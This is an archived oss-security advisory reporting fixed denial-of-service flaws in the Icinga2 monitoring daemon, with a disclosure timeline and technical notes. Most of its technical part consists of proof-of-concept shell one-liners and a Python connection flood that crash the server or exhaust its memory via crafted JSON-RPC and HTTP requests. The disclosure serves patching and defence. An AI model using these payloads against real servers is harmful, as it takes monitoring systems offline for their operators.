  oss-security - Denial of service and other vulnerabilities in Icinga 2.x before  version            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 22 Mar From: Michael Hanselmann <public@...smi.ch> To: oss-security@...ts.openwall.com Subject: Denial of service and other vulnerabilities in Icinga 2.x before  version  A series of denial of service (DoS) vulnerabilities was discovered in Icinga2, an Open Source network monitoring program. While some lead to excessive resource usage, others cause the server daemon to terminate after asserting on pointer values.  All reported issues have been fixed in Icinga  Other security researchers may find information on how to report security issues at <https://www.icinga.com/community/security/>. This advisory is also available at   CVEs ----  By sending specially crafted requests, authenticated and unauthenticated, an attacker can exhaust a lot of memory on the server side, triggering the OOM killer. Patches: and others  By sending specially crafted messages, an attacker can cause a NULL pointer dereference, which can cause Icinga2 to crash. Patches:  Lack of a constant-time password comparison function can disclose the password to an attacker. Patches:   Timeline --------  to An investigation after a program crash while configuring Icinga2 led to the discovery of a series of denial of service (DoS).  A GnuPG-encrypted e-mail was sent to one of Icinga2's core developers asking for the appropriate contact address for security concerns. As of January 29, no reply was received.  A work colleague sends an e-mail with a question to the same effect to CEO of Netways. As of January 29, no reply was received.  An initial version of this report is sent to info@...nga.com and info@...ways.de.  Icinga project confirms the verification of all findings and starts working on patches.  Icinga project delivers first set of patches and makes minor changes after review by reporter. CVE numbers have been requested and assigned.  Changes are merged into public Git master branch.  Reviewed code in more depth and reported one missing fix and one new issue. Documentation for future security issue reports is available at <https://www.icinga.com/community/security/>.  Late February to early March Icinga merges more changes related to reported issues.  Author is informed that a release is planned for March 22,  Icinga releases version   Environment -----------  Tests were made with Icinga2 on Debian 9 (Stretch).   Technical comment -----------------  In most places Icinga2 uses Boost's intrusive_ptr<T> to store pointers rather than raw pointers. intrusive_ptr<T>::operator* and intrusive_ptr<T>::operator-> assert that the pointer value is not NULL. At least the upstream builds for Debian Stretch have these assertions enabled. Other environments may not, thus leading to an actual NULL pointer dereference.   Unauthenticated DoS -------------------  Null pointer dereference in JsonRpcConnection::SendMessage (m_Endpoint is nullptr):  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "",   "params": {} }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect ---  Null pointer dereference in JsonRpcConnection::HeartbeatAPIHandler (params->Get):  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "event::Heartbeat",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect ---  Null pointer dereference in UpdateCertificateHandler (params->Get):  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "pki::UpdateCertificate",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect ---  Null pointer dereference in ApiListener::ConfigUpdateObjectAPIHandler (params->Get):  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "config::UpdateObject",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect ---  Authenticated DoS -----------------  Null pointer dereference in ApiListener::ConfigDeleteObjectAPIHandler (params->Get), requires accept_config=true, to pass validation both endpoints must be in same zone or destination must be a child:  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "config::DeleteObject",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect -key client.key \   -cert client.crt -CAfile ca.crt ---  Null pointer dereference in Checkable::ExecuteRemoteCheck (macros=NULL), to pass validation both endpoints must be in same zone or destination must be a child:  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "bar",   "jsonrpc": "2.0",   "method": "event::ExecuteCommand",   "params": {     "host": "client",     "command_type": "check_command",     "command": "yum",     "macros": null   } }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect -key client.key \   -cert client.crt -CAfile ca.crt ---  Multi-master HA setup, both endpoints must be in same zone, NULL pointer dereference in ClusterEvents::ExecuteCommandAPIHandler (params->Get), dereference location depends on accept_commands (works with either value):  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "event::ExecuteCommand",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect -key server.key \   -cert server.crt ---  ApiListener::ConfigUpdateHandler (params->Get), requires accept_config=true, to pass validation both endpoints must be in same zone or destination must be a child:  --- msg=$(jq --null-input --compact-output --raw-output '{   "id": "foo",   "jsonrpc": "2.0",   "method": "config::Update",   "params": null }') && \ { sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \ openssl s_client -connect -key client.key \   -cert client.crt ---  Authenticated script execution leads to pointer dereference -----------------------------------------------------------  Execute script and pass "null" as pointer value, requires "console" permission, may also apply to other functions available via script and taking pointers:  --- curl -H 'Accept: application/json' -XPOST -v -k -u "user:password" \   ---  Excessive resource usage ------------------------  Unbounded resource usage due to spawning one thread per connection; this Python script is effectively a threadbomb on the destination and uses all available memory on the Icinga server connections used MB of RAM on a system); clients not sending anything are never terminated:  --- import resource import socket import time  resource.setrlimit(resource.RLIMIT_NOFILE,  conn = []  while True:     try:             except BaseException as err:         print(err)         break  print(len(conn))  while True:     time.sleep(1) ---  Produce std::bad_alloc in HttpChunkedEncoding::ReadChunkFromStream (length indicator is signed integer; size check seems to prevent worse things); same principle should work in responses to clients  --- { sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application/json\nTransfer-Encoding: chunked\n\n-2\r\nDummy\r\n0\r\n\r\n'; sleep 5; } | \ openssl s_client -connect ---  Consume lots of memory, sometimes leading to assertions (requires sufficient bandwidth to server):  --- { sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application/json\nTransfer-Encoding: chunked\n\nFFFFFFFF\r\n'; while true; do dd if=/dev/zero bs=1M; done; } | \ openssl s_client -connect ---  Consume lots of memory and CPU; can trigger OOM killer; run multiple instances in parallel:  --- for i in do \   { \     sleep 1; echo -ne \     while true; do dd if=/dev/zero bs=1M; done; \   } | openssl s_client -connect & done; wait ---  Inject many messages into queue and trigger OOM killer:  --- for _ in do \   { \   msg=$(jq --null-input --compact-output --raw-output '{     "id": "foo",     "jsonrpc": "2.0",     "method": "icinga::Hello",     "params": {}   }') && \   sleep 1; \   for ((i=0; ; ++i)); do \     echo -n "${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},"; \   done \   } | socat stdin & done; wait ---  Invoke OOM killer (negative content length):  --- { sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application/json\nContent-Length: dd if=/dev/zero bs=1M; } | \ openssl s_client -connect ---  Provoke OOM killer by filling internal JSON message queue:  --- for _ in do \   { \   msg=$(jq --null-input --compact-output --raw-output '{     "id": "foo",     "jsonrpc": "2.0",     "method": "icinga::Hello",     "params": {}   }') && \   sleep 1; \   for ((i=0; ; ++i)); do \     echo -n "${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},"; \   done \   } | socat stdin & done; wait ---  Bonus findings --------------  HttpServerConnection::ProcessMessageAsync doesn't use constant-time password comparison (https://codahale.com/a-lesson-in-timing-attacks/).  EventQueue::ProcessEvent and FilterUtility::GetFilterTargets use "&*" on a possibly-NULL std::unique_ptr; it's the author's understanding that doing so may be undefined behaviour and should be avoided: (drafting as of this writing); std::unique_ptr<T>::get may be more suitable.  There is no way to disable unauthenticated connections, i.e. those without client certificates. In environments where the certificates are configured through other means, i.e. Puppet, remote connections could be limited to those presenting a client certificate.    Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      